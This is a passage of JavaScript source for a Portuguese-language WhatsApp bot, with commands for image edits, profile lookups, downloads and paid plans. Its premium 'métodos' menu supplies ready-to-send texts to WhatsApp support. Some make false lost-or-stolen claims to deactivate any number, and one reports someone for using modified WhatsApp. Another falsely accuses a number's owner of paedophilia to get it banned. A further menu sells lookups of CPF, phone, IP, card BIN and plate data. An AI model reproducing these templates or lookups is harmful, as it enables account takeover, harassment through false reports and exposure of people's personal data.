					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis14.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=68%25&text.0.size=60&text.0.color=ffffff&text.0.font.family=Sigmar%20One&text.0.font.style=italic&text.0.background.opacity=17&text.0.outline.color=a99cff&text.0.outline.width=9&text.0.outline.blur=16`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break	
					
					case 'edit15':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis15.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=62%25&text.0.size=63&text.0.color=000000&text.0.font.family=Audiowide&text.0.font.style=italic&text.0.background.opacity=15&text.0.outline.color=ffffff&text.0.outline.width=9&text.0.outline.blur=33`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break	
					
					case 'edit16':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis16.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=58%25&text.0.size=99&text.0.color=fffefe&text.0.font.family=Permanent%20Marker&text.0.background.color=000000&text.0.outline.color=000000&text.0.outline.width=19&text.0.outline.blur=66`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
			                break	
			                
case 'narutoedits': {
data = fs.readFileSync('./funções de cmd/imgs/edit-videos/editsnaruto.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺✰𝑵𝑨𝑹𝑼𝑻𝑶፝֯֟⋆⁺˖⸙̭❛◌*̥₊\n👤 𝘚𝘰𝘭𝘪𝘤𝘪𝘵𝘢𝘥𝘰 𝘱𝘰𝘳: ${pushname}\nDeseja mais? Clica em próxima-edit`]
var taikin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
tst = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}narutoedits`, buttonText: {displayText: '☔𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓☔'}, type: 1}]
let thumbInfo = `${taikin}`;
buttonMessage = {video: tst, caption: `${thumbInfo}`, 
footer: `By: ${NomeDoBot}`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: m})
}
break			       

case 'jujutsuedits': {
data = fs.readFileSync('./funções de cmd/imgs/edit-videos/editsjujutsu.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺 𝐉𝐔𝐉𝐔𝐓𝐒𝐔፝֯֟⋆⁺˖⸙̭❛◌*̥₊\n👤 𝘚𝘰𝘭𝘪𝘤𝘪𝘵𝘢𝘥𝘰 𝘱𝘰𝘳: ${pushname}\nDeseja mais? Clica em próxima-edit`]
var taikin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
tst = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}jujutsuedits`, buttonText: {displayText: '☔𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓☔'}, type: 1}]
let thumbInfo = `${taikin}`;
buttonMessage = {video: tst, caption: `${thumbInfo}`, 
footer: `By: ${NomeDoBot}`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: m})
}
break

case 'itachiedits': {
data = fs.readFileSync('./funções de cmd/imgs/edit-videos/edits.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺፝֯֟⋆⁺˖⸙̭❛◌*̥₊\n👤 𝘚𝘰𝘭𝘪𝘤𝘪𝘵𝘢𝘥𝘰 𝘱𝘰𝘳: ${pushname}\nDeseja mais? Clica em próxima-edit`]
var taikin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
tst = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}itachiedits`, buttonText: {displayText: '☔𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓☔'}, type: 1}]
let thumbInfo = `${taikin}`;
buttonMessage = {video: tst, caption: `${thumbInfo}`, 
footer: `By: ${NomeDoBot}`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: m})
}
break         
			                
case 'getcase':
try{
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("nezuko.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCase(q)}`)
} catch(e) {
console.log(e)
reply('Case inexistente')
}
break

            case 'danielfulll':
reply(`${isGroup ? 'Estou enviando no seu privado.':'Aqui está o contato.'}`)
await delay(100)
nezuko.sendMessage(sender, {text: `*A baixo O Contato Do meu Criador:*`, footer: `${NomeDoBot}`, buttons: [{buttonId: `${prefix}criador`, buttonText: {displayText: `Daniel Drk`}, type: 1}, {buttonId: `${prefix}Redes`, buttonText: {displayText: 'Redes Sociais'}, type: 1}]}, {quoted: Nakatin2})
break

case 'redes':
reply(`${isGroup ? 'Estou enviando no seu privado.':'Aqui está.'}`)
await delay(100)
var redesnaka = `

*Olá ${pushname}!*

*✨ Siga Nosso Perfil Nas Redes Sociais ✨*

───────「令」───────
*🪀️ Grupo ofc:* https://chat.whatsapp.com/IHY1ELDL9KqGq9rYVjrSXt

*📸 Instagram:* @_._caue
───────「令」───────`
nezuko.sendMessage(sender, {image: {url: logo}, caption: redesnaka, footer: ``, buttons: [{buttonId: `${prefix}danielfulll`, buttonText: {displayText: `🐉 Meu Criador`}, type: 1}]}, {quoted: dnselo})
break

case 'criador':
            case 'desenvolvedor': {

                let vcard =
                    'BEGIN:VCARD\n'
                    + 'VERSION:3.0\n'
                    + 'N:;Kira;;;\n'
                    + 'FN:Kira\n'
                    + 'item1.TEL;waid=5521964523665:+55 21 96922-6661\n'
                    + 'item1.X-ABLabel:Celular\n'
                    + 'END:VCARD'

                await nezuko.sendMessage(m.chat, { contacts: { displayName: 'Daniel', contacts: [{ vcard }] } }, { quoted: dnselo})
                await reply('O contato dele caso você use imune https://wa.me/5521964523665')
            }

                break

case 'criargp':
if (!SoDono && !info.key.fromMe) return  reply(enviar.msg.donosmt)
//by Nezuko-MD 
const group = await nezuko.groupCreate(`Grupo Criado por Nezuko`, [`${numerodn}@s.whatsapp.net`])
console.log ("created group with id: " + group.gid)
nezuko.sendMessage(group.id, {
text: 'Prontinho, fiz oq vc pediu!'
})
break

case 'igstalk': case 'instagramstalk': {
if (!text) return m.reply(`*Kd o nome ? exemplo: ${prefix + command} affz._.carlos*`)
tod = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${text}?apikey=${lolkey}`)
//gaber = tod.result.photo_profile
try {
gaber = tod.result.photo_profile
} catch(e) {
gaber = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

teks = ` *_STALKER_*
▢ Nome de usuário:  ${tod.result.username}
▢ Nome: ${tod.result.fullname}
▢ Seguidores: ${tod.result.followers}
▢ Seguindo : ${tod.result.following}
▢ Quantidade de post: ${tod.result.posts}
▢ Bio: ${tod.result.bio}`
var yaha = await getBuffer(gaber)
nezuko.sendMessage(m.chat, { image: yaha, jpegThumbnail:yaha, caption: `${teks}` }, { quoted: dnselo}).catch((err) => m.reply('*Nome não encontrado*'))
}
break

                     case 'gitstalker':
{
  if (!q) return reply('Cadê o username do cara cria??')
  reply('Buscando informações...')
kika = await fetchJson(`https://nezsab-apis.xyz/api/githubuser?usuario=${q}&apikey=${keyapi}`);
let buttonss = [
{buttonId: `a`, buttonText: {displayText: `Obrigado ${NomeDoBot} !`}, type: 1}]
let thumbInfo = `⚠︎ 👤 [ 𝐆𝐈𝐓𝐇𝐔𝐁 𝐒𝐓𝐀𝐋𝐊𝐄𝐑 ] 👤 ⚠︎\n• Usuário pesquisado⧽ ${kika.resultado.username}\n• Nome do Perfil⧽ ${kika.resultado.apelido}\n• Biografia⧽ ${kika.resultado.bio}\n• Link do perfil⧽ ${kika.resultado.user_url}\n• Seguidores⧽ ${kika.resultado.seguidores}\n• Seguindo⧽  ${kika.resultado.seguindo}\n• Tipo de Conta⧽ ${kika.resultado.conta_tipo}\n• Conta criada⧽ ${kika.resultado.conta_criada}\n• Último Update⧽ ${kika.resultado.ultima_update}`;
buttonMessagse = {image:{url: `${kika.resultado.foto_url}`}, caption: `${thumbInfo}`, footer: `Solicitado por: ${pushname}`, buttons: buttonss, headerType: 4}
nezuko.sendMessage(from, buttonMessagse, {quoted: dnselo})
}
break              

case 'igdl':
case 'instadw': 
case 'igdl':
case 'instadw': 
case 'instagram':   
if(!q) return reply("Cadê o link?")
axios.get(`https://api.brizaloka-api.tk/sociais/instagram?apikey=brizaloka&url=${q}`)
.then(e => {
try{
d = e.data;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `*Criador do Reels:* @${d[0].author}\n*Descrição:* ${d[0].desc}`;
}
nezuko.sendMessage(from, {video:{url: d[0].url}, caption:txt})
}catch(err){
reply(`Erro ao baixar a mídia!`)
}
}).catch(err => {
console.log(err);
});
break
//========METODO DESBAN=============\\

case 'desbanir':
case 'desban':
if(!isPremium) return reply(enviar.msg.premium)
if(!budy.includes("/")) return m.reply(`Exemplo: ${prefix}desbanir Número banido injustamente/Meu número +55 79 xxxx-xxxx foi banido injustamente desbana por favor`)
var [qsp, qsp2] = q.split("/")
await fetchJson(`https://rafinha043.herokuapp.com/enviar/email?titulo=${qsp}&texto=${qsp2}&apikey=KgIbfyAJ`)
m.reply(`Olá ${pushname} A mensagem foi enviada para o suporte com sucesso só aguardar...`) 
break

case 'desban2':
if(!isPremium) return reply(enviar.msg.premium)
if(!budy.includes("/")) return m.reply(`Exemplo: ${prefix}desbanir Número banido injustamente/Meu número +55 79 xxxx-xxxx foi banido injustamente desbana por favor`)
var [qsp, qsp2] = q.split("/")
await fetchJson(`https://rafinha043.herokuapp.com/enviar/email?titulo=${qsp}&texto=${qsp2}&apikey=qzFGCJv3`)
reply(`Olá ${pushname} A mensagem foi enviada para o suporte com sucesso só aguardar...`) 
break

case 'retirarsp':
if(!isPremium) return reply(enviar.msg.premium)
buttonss = [
  {buttonId:`${prefix}menos1`, buttonText: {displayText: '🐉 Rᥱtιrᥲr D᥆ Sᥙρ᥆rtᥱ 1 🐉' }, type: 1},
  {buttonId:`${prefix}menos2`, buttonText: {displayText: '🐉 Rᥱtιrᥲr D᥆ Sᥙρ᥆rtᥱ 2 🐉' }, type: 1},
  {buttonId: `${prefix}bandesban`, buttonText: {displayText: '🐉 Mᥱt᥆d᥆᥉ Bᥲᥒιr/Dᥱ᥉bᥲᥒιr 🐉' }, type: 1}]
ab = await getBuffer(`https://telegra.ph/file/db0956276ed548db4aa21.jpg`);
buttonMessagge = {
image: ab,
caption: "\n  Bᥡ: Lorde",
buttons: buttonss,
headerType: 1
}
nezuko.sendMessage(from, buttonMessagge, {quoted: dnselo})
break


case 'bandesban': {
if(!isPremium) return reply(enviar.msg.premium)
let buttonns = [
  {buttonId:`${prefix}mtdban`, buttonText: {displayText: '🐉 T᥊t Bᥲᥒιr Zᥲρ 🐉' }, type: 1},
  {buttonId:`${prefix}mtddesban`, buttonText: {displayText: '🐉 T᥊t Dᥱ᥉bᥲᥒιr Zᥲρ 1 🐉'}, type: 1},
  {buttonId: `${prefix}mtddesban2`, buttonText: {displayText: '🐉 T᥊t Dᥱ᥉bᥲᥒιr Zᥲρ 2 🐉' }, type: 1}]
blabla = await getBuffer(`https://telegra.ph/file/2b2474618e0324d179724.jpg`);
buttonMesssage = {image: blabla, caption: `\n  Bᥡ: Nᥱzᥙk᥆`, buttons: buttonns, headerType: 4}
nezuko.sendMessage(m.chat, buttonMesssage, {quoted: dnselo})
}
break

case 'menos1': case '-1':
if(!isPremium) return reply(enviar.msg.premium)
await reply (`

assunto:
Não recebo código de verificação

resposta:

Alguém solicitou meu código por engano, e agora não consigo entrar no meu whatsapp, peço que o suporte do whatsapp redefina o meu tempo para que eu possa pedir SMS e ligação Número: +55 82 9999-9999

`)

break

case 'menos2': 
if(!isPremium) return reply(enviar.msg.premium)
await reply(`

Assunto: Não consigo entrar no whatsapp!

resposta: Eu nao consigo entrar no whatsapp , meu número esta -1 , solicito que resetem minha verificação de número!
Número: +55 99 9999-9999

`)

break

case 'mtdban': 
if(!isPremium) return reply(enviar.msg.premium)
await reply(`

Assunto: Usuário violando os termos de uso do whatsapp usando versões modificadas de whatsapps.

resposta: Olá, hojé eu percebi que um homem estava usando whatsapp modificado, falei para ele que talvez a conta dele poderia ser banida mais ele nem ligou, pesquisei no Google e vi que whatsapp modificados dão ban, então peço que o suporte dê ban nesta conta por estar usando whatsapp modificado.

Número: +55 99899
`)

break



case 'mtddesban': 
if(!isPremium) return reply(enviar.msg.premium)
await reply(`

Assunto: Roubado/perdido

Desativem a minha conta +55 999999555

`)

break

case 'mtddesban2': 
if(!isPremium) return reply(enviar.msg.premium)
await reply(`

Assunto: Número Banido

resposta: Ola suporte do whatsapp , meu numero ,(+55 9999999) foi banido injustamente do whatsapp , estou solicitando o desbanimento imediato de meu número

`)
break

case 'mtddesban3': 
if(!isPremium) return reply(enviar.msg.premium)
await reply(`

Assunto: Número banido injustamente

olá meu nome é Ricardo, trabalho com vendas no aplicativo Whatsapp. Recentemente me eu número foi algo de um grupo de web terroristas e a 3 dias atrás ele foi banido injustamente por favor verifiquem!

(Após o support responder você envia o número completo com +55 etc..)

`)

break

case 'metodos': // by: Nezuko-MD
if(!isPremium) return reply(enviar.msg.premium)
var sections = [
    {
	title: "Dᴇsʙᴀɴɪʀ Nᴜ́ᴍᴇʀᴏs",
	rows: [
	    {title: "🛑 ️𝐃𝐞𝐬𝐛𝐚𝐧 1 ", rowId: `${prefix}txt-desban1`},
{title: "🛑 𝐃𝐞𝐬𝐛𝐚𝐧 2", rowId: `${prefix}txt-desban2`},
{title: "🛑 𝐃𝐞𝐬𝐛𝐚𝐧 3", rowId: `${prefix}txt-desban3`},
{title: "🛑 𝐃𝐞𝐬𝐛𝐚𝐧 4", rowId: `${prefix}txt-desban4`},
	    {title: "🛑 𝐃𝐞𝐬𝐛𝐚𝐧 5", rowId: `${prefix}txt-desban5`, description: ""}
	]
    },
   {
	title: "Sᴀɪʀ Dᴏ -1",
	rows: [
	    {title: "🛑 𝐒𝐚𝐢𝐫 𝐝𝐨 -1", rowId: `${prefix}txt-sair-1-1`},
	    {title: "🛑 𝐒𝐚𝐢𝐫 𝐝𝐨 -1 (2)", rowId: `${prefix}txt-sair-1-2`, description: ""}
	]
    },
    {
	title: "Dᴇsᴀᴛɪᴠᴀʀ Nᴜ́ᴍᴇʀᴏs",
	rows: [
	    {title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 1", rowId: `${prefix}txt-desativar1`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 2", rowId: `${prefix}txt-desativar2`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 3", rowId: `${prefix}txt-desativar3`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 4", rowId: `${prefix}txt-desativar4`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 5", rowId: `${prefix}txt-desativar5`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 6", rowId: `${prefix}txt-desativar6`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 7", rowId: `${prefix}txt-desativar7`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 8", rowId: `${prefix}txt-desativar8`},
	{title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 9", rowId: `${prefix}txt-desativar9`},
	    {title: "🛑 𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 10", rowId: `${prefix}txt-desativar10`, description: ""}
	]
    },
]

const monarge01 = {
  text: "Dᴇsʙᴀɴ, Sᴀɪʀ Dᴏ -1",
  footer: "© Cᴏᴘʏʀɪɢʜᴛ Bʏ Nᴇᴢᴜᴋᴏ-MD",
  title: "🔒 Mᴇ́ᴛᴏᴅᴏs Cᴏᴍᴘʟᴇᴛᴏs 🔒",
  buttonText: "Mᴇɴᴜ Mᴇ́ᴛᴏᴅᴏs",
  sections
}

const sendMsg = await nezuko.sendMessage(from, monarge01, {quoted: dnselo})
break 

case 'txt-desativar10': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nPedófila e abuso sexual , peço banimento desse número ao suporte Whatsapp , ele está envolvido com grupos de pedófilia da deep web , peço que ajudem nisso pois meu filho foi vítima.
Número: +55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar9': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá , eu perdi todos meus documentos junto com meu celular e preciso imediatamente que desativem meu número:
+55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar8': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\n偷⾛了我的⼿机和我所有的宝⻉，请⽴即禁⽌我的帐⼾
+55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar7': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá , eu gostaria de desativar meu número do WhatsApp porque eu estou migrando para o telegram , Meu número:
+55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar6': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá fui assaltado a uns 30 minutos e roubaram todos meus pertences , quero que desativem minha conta do whatsapp.
Número: +55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar5': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu numero do whatsapp foi roubado , desativem minha conta imensamente , desde já agradeço! meu numero :
+55 99999-99999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar4': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nPerdido/Roubado: Por favor, desative minha conta
+55 11 11111-11111`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar3': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nEstou solicitando a desativação temporária de minha conta no whatsapp , meu numero:
+55 11 11111-1111`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar2': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nPlease Deactivate The My Account Number (número*) Immediately Because The Number Has Been Lost`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desativar1': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá,perdi todos os meus documentos e o meu chip foi roubado. Peço que desativem
minha conta imediatamente,no chip há dados sobre mim por isso peço que desativem,meu  número imediatamente (número)`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desban1': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu número (Número) foi banido indevidamente isto foi um engano . Fui clonado e roubaram meu número preciso ativar minha conta tenho uma empresa de eletrodomésticos e tenho pedidos pendentes.`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desban2': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu número (Numero) , foi banido do whatsapp injustamente e tenho provas pra mostrar que o banimento foi um erro do sistema.`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desban4': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOla suporte do whatsapp , meu numero ,(numero) foi banido injustamente do whatsapp , estou solicitando o desbanimento imediato de meu número `
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desban5': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOla eu sou roberto silva, eu comprei um número número para meu filho fazer os trabalhos da escola em qual ele estuda , porém quando fui tentar entrar , estava dizendo que o número foi banido e eu nem sequer entrei no número, não fiz nada eu ja comprei o número e ele ja estava assim , ele precisa urgentemente desse número para fazer os trabalhos da escola.
Verifiquem o maís rápido possível!
NÚMERO: 55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-desban3': //By: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu numero foi banido, utilizo ele para falar com meus amigos e familia. Além de falar com meus clientes, e estou sendo prejudicado perdendo vendas +55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-sair-1-2': // by: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nEu nao consigo entrar no whatsapp , meu número esta -1 , solicito que resetem minha verificação de número!
Número: +55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

case 'txt-sair-1-1': // by: Nezuko-MD
bymonarge =`⊶ۣۜۜ͜͡ 🛑Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu número está no suporte alguém solicitou meu código por engano meu número é usado para conversas com familiares que estão com convite por favor reinicie o meu código de verificação via SMS!
Número: +55 99 9999-9999`
nezuko.sendMessage(from, {text: bymonarge}, {quoted: info})
break

//========FIM=============\\

case 'alugar': case 'aluguel': {
                let buttonse = [
                    {buttonId: `/contratar`, buttonText: {displayText: 'CONTRATAR PLANOS💲'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `☑️ 𝗣𝗟𝗔𝗡𝗢𝗦 𝗘 𝗩𝗔𝗟𝗢𝗥𝗘𝗦


✅ Consultas
✅ Comandos para grupos
✅ Administração de grupos
✅ Baixo músicas 
✅ Auto sticker
✅ Playlist

🔘 Escolha um plano.

👤 PLANOS INDIVIDUAIS

🟢 07 DIAS = R$ 10,00
🟢 30 DIAS = R$ 20,00

👥 PLANOS PARA GRUPOS

🟢 07 DIAS = R$ 15,00
🟢 15 DIAS = R$ 25,00
🟢 30 DIAS = R$ 35,00


💰 FORMAS DE PAGAMENTO

🟢 PIX`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonse,
                    headerType: 2
                }
                nezuko.sendMessage(from, buttonMessagee)
            }
            break

case 'plano': case 'planos': {
                let buttonse = [
                    {buttonId: `/contratar`, buttonText: {displayText: '☔ CONTRATAR PLANOS ☔'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `┏⧐┅┅┅⃟🌺┅┅⧏ ❀ ⧐┅┅🌺⃟┅┅┅⧏┓
                 𝗖𝗢𝗡𝗧𝗥𝗔𝗧𝗔𝗥 𝗕𝗢𝗧
ㅤㅤ  ㅤ

[☔] BOT DE WHATSAPP 24H ON
[☔] SUPORTE 24h
[☔] ORGANIZE SEU GRUPO
[☔] GERENCIE SEU GRUPO
[☔] PROTEJA SEU GRUPO
[☔] DEIXE SEU GRUPO MAIS ANIMADO

____________𝗣𝗟𝗔𝗡𝗢𝗦____________

*[☔] TESTE 24H:* R$ 1,00
*[☔] SEMANAL:* R$ 7,00
*[☔] MENSAL:* R$ 15,00
*[☔] ARQUIVO R$ 50,00

____________𝗣𝗥𝗢𝗧𝗘𝗖̧𝗢̃𝗘𝗦____________

[☔] ANTI-LINK
[☔] ANTI-FAKE
[☔] ANTI-CONTATO
[☔] ANTI-LOCALIZAÇÃO
[☔] ANTI-DOCUMENTO
[☔] ANTI-VIDEO
[☔] ANTI-IMAGEM
[☔] ANTI-HIDETAG
[☔] ANTI-AUDIO
[☔] ANTI-VIEWONCE

____________𝗥𝗘𝗖𝗨𝗥𝗦𝗢𝗦____________

[☔] CRIAR FIGURINHAS
[☔] AUTO STICKER
[☔] BAIXAR MÚSICAS
[☔] BAIXAR VIDEOS
[☔] ABRIR/FECHAR
[☔] BAN & REVIVER
[☔] BRINCADEIRAS
[☔] COMANDOS +18
[☔] FIGURINHAS INTERATIVAS

____________𝗖𝗢𝗡𝗧𝗥𝗔𝗧𝗔𝗥____________
[☔] DONO OFICIAL: Kira
[☔] NÚMERO DONO:
wa.me/556291004465
┗⧐┅┅┅⃟🌺┅┅⧏ ❀ ⧐┅┅🌺⃟┅┅┅⧏┛`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonse,
                    headerType: 2
                }
                nezuko.sendMessage(from, buttonMessagee)
            }
            break

case 'infopuxadas': case 'menupux': {
                let buttonse = [
                    {buttonId: `/danielfulll`, buttonText: {displayText: 'contratar'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `☑️ 𝗣𝗟𝗔𝗡𝗢𝗦 𝗗𝗘 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔𝗦

𝗢𝗣𝗖̧𝗢̃𝗘𝗦 𝗗𝗘 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 

Cpf1
Cpf2
Cpf3
Cpf4
Cpf5
Nome
Telefone
Telefone2
IP
Cep 
Bin
Placa
CNPJ 
Gerarpessoa
Gerarpessoa2

𝗧𝗘𝗠 𝗣𝗟𝗔𝗡𝗢𝗦 𝗠𝗘𝗡𝗦𝗔𝗜𝗦 𝗘 𝗦𝗘𝗠𝗔𝗡𝗔𝗜𝗦, 𝗣𝗥𝗘𝗖̧𝗢 𝗣𝗩

wa.me/5521964523665

💰 𝗙𝗢𝗥𝗠𝗔𝗦 𝗗𝗘 𝗣𝗔𝗚𝗔𝗠𝗘𝗡𝗧𝗢 

🟢 𝗣𝗜𝗫`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonse,
                    headerType: 2
                }
                nezuko.sendMessage(from, buttonMessagee)
            }
            break

case 'contratar':
reply(`*Dono Do Lorde Bot MD*
*Contato: wa.me/556291004465*
*Instagram: daniell_dn1*

*Grupo ofc*: https://chat.whatsapp.com/DTsrSH5CVF66Xvn9Ow61Yn`), { quoted: dnselo }
break

case 'quando': 
if (args.length < 1) return reply('Digite a pergunta')
random = arrayQND[Math.floor(Math.random() * arrayQND.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (random == 'Hoje' || random == 'Amanhã' || random == 'Nunca') {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${random}`
} else if (random2 == 1) {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: 1 ${random}`
} else {
random3 = arrayQND2[Math.floor(Math.random() * arrayQND2.length)]
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${random2} ${random3}`
}
reply(texto)
break

case 'ytmp3-v2': 
// @VitinhoGostoso
url = args.join(' ')
if (!url) return reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
reply(enviar.espere)
anu = await fetchJson(`https://lolizit-api.herokuapp.com/api/download/ytmp3?url=${url}&apikey=apikeyFree30days`)
anu = anu.resultado
pla = `➡️ *Título:* ${anu.título}\n`
pla += `📬️ *Visualizações:* ${anu.visualizações}\n`
pla += `⚡️️ *Canal:* ${anu.canal}\n`
